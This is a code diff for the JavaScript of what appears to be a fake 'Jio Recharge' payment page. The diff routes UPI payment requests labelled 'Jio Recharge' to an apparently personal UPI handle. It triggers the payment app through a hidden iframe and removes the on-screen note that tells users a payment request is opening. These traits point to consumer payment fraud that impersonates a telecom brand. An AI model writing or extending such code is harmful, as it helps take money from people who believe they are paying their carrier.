@@ -150,16 +150,28 @@ if (payAmount) {
 upiOptions.forEach((option) => {
   option.addEventListener("click", () => {
     const amount = String(payAmount?.textContent?.trim() || getSafeAmount(getSavedAmount()));
-    const vpa = option.dataset.vpa || "Paytm.s2vv2a7@pty";
+    const appName = option.querySelector("strong")?.textContent || "UPI app";
+    const paymentScheme = option.dataset.scheme || "upi://pay";
+    const vpa = option.dataset.vpa || "pandaheer8@okaxis";
     const name = option.dataset.name || "Jio Recharge";
     const cleanedAmount = amount.replace(/[^\d.]/g, "");
     const rechargeFor = pageNumber || "selected number";
-    const upiLink = `upi://pay?pa=${encodeURIComponent(vpa)}&pn=${encodeURIComponent(name)}&am=${encodeURIComponent(cleanedAmount)}&cu=INR&tn=${encodeURIComponent("Recharge " + rechargeFor)}`;
+    const upiLink = `${paymentScheme}?pa=${encodeURIComponent(vpa)}&pn=${encodeURIComponent(name)}&am=${encodeURIComponent(cleanedAmount)}&cu=INR&tn=${encodeURIComponent("Recharge " + rechargeFor)}`;
 
-    if (paymentNote) {
-      paymentNote.textContent = `Opening UPI payment request for ₹${cleanedAmount}...`;
-    }
+    const clickedAt = Date.now();
 
-    window.location.href = upiLink;
+    const iframe = document.createElement("iframe");
+    iframe.style.display = "none";
+    iframe.src = upiLink;
+    document.body.appendChild(iframe);
+
+    setTimeout(() => {
+      if (iframe.parentNode) {
+        document.body.removeChild(iframe);
+      }
+      if (Date.now() - clickedAt < 2000) {
+        window.location.href = upiLink;
+      }
+    }, 2000);
   });
 });
